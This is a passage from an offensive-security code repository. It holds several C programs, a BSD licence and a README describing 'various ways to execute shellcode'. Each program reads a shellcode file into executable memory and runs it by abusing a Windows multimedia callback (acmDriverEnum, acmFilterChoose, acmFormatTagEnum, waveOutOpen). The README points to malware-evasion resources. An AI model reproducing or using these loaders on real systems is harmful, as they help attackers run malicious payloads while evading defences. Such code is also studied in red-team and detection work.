#include <stdio.h>
#include <windows.h>
#include <mmreg.h>
#include <msacm.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: acmDriverEnum.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	acmDriverEnum((ACMDRIVERENUMCB)hAlloc, 0, 0);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/acmFilterChoose.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Msacm32.lib")

#include <stdio.h>
#include <windows.h>
#include <mmreg.h>
#include <msacm.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: acmFilterChoose.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	WAVEFILTER sWF = { 0 };
	sWF.cbStruct = sizeof(WAVEFILTER);

	ACMFILTERCHOOSE sACMFilterChoose = { 0 };
	sACMFilterChoose.cbStruct = sizeof(ACMFILTERCHOOSE);
	sACMFilterChoose.fdwStyle = ACMFILTERCHOOSE_STYLEF_ENABLEHOOK;
	sACMFilterChoose.pwfltr = &sWF;
	sACMFilterChoose.cbwfltr = sizeof(WAVEFILTER);
	sACMFilterChoose.pfnHook = hAlloc;

	acmFilterChoose(&sACMFilterChoose);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/acmFormatTagEnum.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Msacm32.lib")

#include <stdio.h>
#include <windows.h>
#include <mmreg.h>
#include <msacm.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: acmFormatTagEnum.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);
	
	ACMFORMATTAGDETAILS sACMFilter = { 0 };
	sACMFilter.cbStruct = sizeof(ACMFORMATTAGDETAILS);
	
	acmFormatTagEnum(NULL, &sACMFilter, hAlloc, NULL, 0);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`C/waveOutOpen.c`:

```c
// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Winmm.lib")

#include <stdio.h>
#include <windows.h>
#include <mmeapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: waveOutOpen.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);


	HWAVEOUT hWaveOut;
	WAVEFORMATEX sWFEx = { 0 };
	sWFEx.wFormatTag = WAVE_FORMAT_PCM;
	sWFEx.nChannels = 2;
	sWFEx.wBitsPerSample = 16;
	sWFEx.nBlockAlign = sWFEx.nChannels * sWFEx.wBitsPerSample / 8;
	sWFEx.nSamplesPerSec = 100;

	waveOutOpen(&hWaveOut, WAVE_MAPPER, &sWFEx, hAlloc, 0, CALLBACK_FUNCTION);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
```

`LICENSE`:

```
BSD 3-Clause License

Copyright (c) 2022, Wra7h
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

3. Neither the name of the copyright holder nor the names of its
   contributors may be used to endorse or promote products derived from
   this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

```

`README.md`:

```md
# FlavorTown
Various ways to execute shellcode.  

C: Written/Tested using an empty project in VS 2022.  
C#: Tested with VS 2022 and csc.

## Usage:
The usage can be found commented at the top of each file. Additionally, there's a basic check to ensure that enough arguments have been passed when executed.

-----

A good resource for other shellcode execution methods is vx underground's "Evasion - Process Creation and Shellcode Execution" section [here](https://www.vx-underground.org/windows.html).  

```